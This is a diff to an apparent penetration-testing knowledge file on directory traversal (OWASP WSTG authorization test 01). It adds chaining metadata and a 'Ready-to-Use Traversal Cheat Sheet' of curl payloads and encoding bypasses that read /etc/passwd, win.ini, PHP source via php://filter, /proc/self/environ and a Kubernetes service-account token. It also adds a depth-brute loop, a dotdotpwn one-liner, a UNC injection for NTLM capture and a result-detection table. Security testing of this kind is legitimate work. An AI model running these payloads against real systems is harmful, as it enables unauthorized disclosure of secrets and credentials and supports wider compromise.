@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: [CWE-639]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-authz-02, wstg-authz-04]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-authz-02: "Directory Traversal (reads config files, secrets, signing keys) + Authorization Bypass = leaked secrets are used to forge access and bypass authorization entirely (Full System Compromise, Critical)"
+  wstg-authz-04: "Directory Traversal + IDOR = arbitrary file paths reachable via traversal combine with unguarded object references to expose every user's files (Mass Arbitrary File Disclosure, Critical)"
 ---
 
 # wstg-authz-01
@@ -311,6 +313,98 @@ if __name__ == "__main__":
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use Traversal Cheat Sheet
+
+```bash
+# Set target and vulnerable parameter first
+target="https://{target}/download?file="
+
+# Linux — /etc/passwd
+curl -s "${target}../../../../etc/passwd"
+curl -s "${target}....//....//....//....//etc/passwd"
+curl -s "${target}..%2f..%2f..%2f..%2fetc%2fpasswd"
+curl -s "${target}..%252f..%252f..%252fetc%252fpasswd"
+curl -s "${target}%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+curl -s "${target}..%c0%af..%c0%af..%c0%afetc/passwd"
+
+# Windows — win.ini
+curl -s "${target}..\..\..\..\windows\win.ini"
+curl -s "${target}..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+# Null byte / extension bypass (legacy PHP < 5.3.4)
+curl -s "${target}../../../etc/passwd%00.png"
+
+# Absolute path / wrapper shortcuts
+curl -s "${target}/etc/passwd"
+curl -s "${target}file:///etc/passwd"
+curl -s "${target}php://filter/convert.base64-encode/resource=../config.php"
+curl -s "${target}php://filter/read=convert.base64-encode/resource=/etc/passwd"
+
+# One-liner: brute traversal depth 1-12, grep for root: marker
+for i in $(seq 1 12); do
+  p=$(printf '../%.0s' $(seq 1 $i))
+  curl -s "https://{target}/download?file=${p}etc/passwd" | grep -q "root:" && \
+    echo "[VULN] depth=$i works"
+done
+```
+
+### dotdotpwn One-Liner
+
+```bash
+dotdotpwn -m http -h {target} -x 443 -f /etc/passwd -k "root:" -e /download?file=TRAVERSAL -s
+```
+
+### Additional Encoding / Filter-Bypass Techniques
+
+```bash
+target="https://{target}/download?file="
+
+# Unicode encoding (legacy IIS / poorly written filters)
+curl -s "${target}%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd"
+
+# Overlong UTF-8 encoding (invalid per spec but accepted by some parsers)
+curl -s "${target}%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd"
+
+# Mangled path — duplicate ../ so that stripping one copy still leaves a working sequence
+curl -s "${target}..././..././..././etc/passwd"
+
+# Nginx/Tomcat reverse-proxy path-confusion: nginx treats /..;/ as a plain
+# directory segment while the backend Tomcat resolves it as /../, exposing
+# servlets/paths nginx thought were blocked
+curl -s "https://{target}/protected/..;/..;/..;/admin/console"
+
+# UNC share injection (Windows) — may also trigger an NTLM auth leak (capture with responder)
+curl -s "${target}\\\\localhost\\c$\\windows\\win.ini"
+
+# ASP.NET cookieless session-ID path segment used to slip past a path-based ACL/filter
+curl -s "https://{target}/(S(x))/admin/(S(x))/main.aspx"
+
+# Java's url:file:// wrapper
+curl -s "${target}url:file:///etc/passwd"
+
+# Linux process/proc-filesystem disclosure
+curl -s "${target}/proc/self/environ"
+curl -s "${target}/proc/self/cwd/index.php"
+curl -s "${target}/run/secrets/kubernetes.io/serviceaccount/token"   # K8s service-account token
+
+# IIS short-name (8.3) enumeration to find files/dirs a traversal payload should target
+# shortscan https://{target}/
+```
+
+### Detection Patterns
+
+| Payload result contains       | Indicates                     |
+| ------------------------------ | ------------------------------ |
+| `root:x:0:0:`                  | Linux `/etc/passwd` read       |
+| `[fonts]` / `[extensions]`     | Windows `win.ini` read         |
+| `<web-app` / `<servlet>`       | Java `web.xml` disclosure      |
+| Base64 blob decodes to `<?php` | PHP source via `php://filter`  |
+| 200 OK on `../../../../etc/passwd` but 404 on nonsense path | Traversal confirmed vs generic error page |
+
+---
+
 ## Remediation Guide
 
 ### 1. Input Validation
@@ -465,6 +559,7 @@ def download_file(file_id):
 - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
 - [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
 - [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)
+- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
 
 
 ---
